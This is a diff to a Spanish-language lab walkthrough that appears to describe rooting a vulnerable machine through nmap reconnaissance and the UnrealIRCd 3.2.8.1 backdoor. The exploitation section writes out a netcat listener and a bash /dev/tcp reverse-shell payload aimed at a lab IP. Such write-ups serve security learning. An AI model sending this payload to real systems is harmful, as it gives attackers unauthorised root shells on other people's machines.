@@ -15,11 +15,13 @@ A continuación realizaremos una pequeña demostración de la toma de esta máqu
 
 ## Reconocimiento
 
+Para acabar de utilizar las herramientas propuestras voy a realizar la primera fase de reconocimiento de servicios con nmap:
+
 ![nmap](img/3.png)
 
 ## Explotación de la vulnerabilidad
 
-Utilizando el exploit de [UnrealIRCd 3.2.8.1](https://www.exploit-db.com/exploits/16922), por elegir alguno. Que básicamente consiste en, abrir una reverse shell `nc -lvp 8080`, establecer una conexión y enviarle un "*AB;* `bash -i >& /dev/tcp/10.0.0.22/8080 0>&1` *\n*". 
+Utilizando el exploit de [UnrealIRCd 3.2.8.1](https://www.exploit-db.com/exploits/16922), por elegir alguno. Que básicamente consiste en, abrir una reverse shell `nc -lvp 8080`, establecer una conexión y enviarle un "*AB;* `bash -i >& /dev/tcp/10.0.0.22/8080 0>&1` *\n*".
 
 Boom! root.
 
